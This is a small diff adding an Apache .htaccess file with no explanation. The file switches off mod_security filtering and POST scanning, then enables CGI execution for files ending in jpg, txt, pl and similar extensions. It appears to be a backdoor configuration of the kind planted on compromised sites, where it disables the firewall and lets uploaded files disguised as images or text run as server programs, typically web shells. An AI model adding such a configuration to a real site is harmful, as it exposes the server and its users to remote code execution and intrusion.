@@ -1,0 +1,8 @@
+<IfModule mod_security.c>
+	SecFilterEngine Off
+	SecFilterSanPOST Off
+</IfModule>
+
+#START #
+Options +ExecCGI 
+AddHandler cgi-script cgi pl ka jpg 4a txt
